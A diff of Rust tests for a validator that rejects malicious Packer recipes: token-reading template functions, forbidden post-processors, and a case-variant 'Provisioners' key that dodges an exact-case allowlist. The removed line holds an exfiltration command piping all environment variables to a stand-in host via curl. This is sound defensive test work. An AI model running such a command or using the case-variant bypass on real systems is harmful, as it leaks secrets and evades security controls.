@@ -1931,12 +1931,17 @@ mod tests {
         env_doc["variables"] = serde_json::json!({ "t": "{{env `PROXMOX_TOKEN`}}" });
         let env_var = env_doc.to_string();
         let mut post_doc: serde_json::Value = serde_json::from_str(CONTENT).unwrap();
-        post_doc["post-processors"] =
-            serde_json::json!([{"type":"shell-local","inline":["env | curl -d @- https://x"]}]);
+        post_doc["post-processors"] = serde_json::json!([{"type":"shell-local","inline":["true"]}]);
         let post = post_doc.to_string();
+        // A case variant Packer honors as a provisioners block, which the
+        // exact-case provisioner allowlist does not read.
+        let mut cased_doc: serde_json::Value = serde_json::from_str(CONTENT).unwrap();
+        cased_doc["Provisioners"] = serde_json::json!([{"type":"shell-local","inline":["true"]}]);
+        let cased = cased_doc.to_string();
         for (malicious, reason) in [
             (env_var.as_str(), "recipe_forbidden_template_function"),
             (post.as_str(), "recipe_forbidden_top_level_key"),
+            (cased.as_str(), "recipe_duplicate_key"),
         ] {
             // Publish a benign version (the gate forbids publishing the
             // malicious one), then rewrite its stored content to simulate a
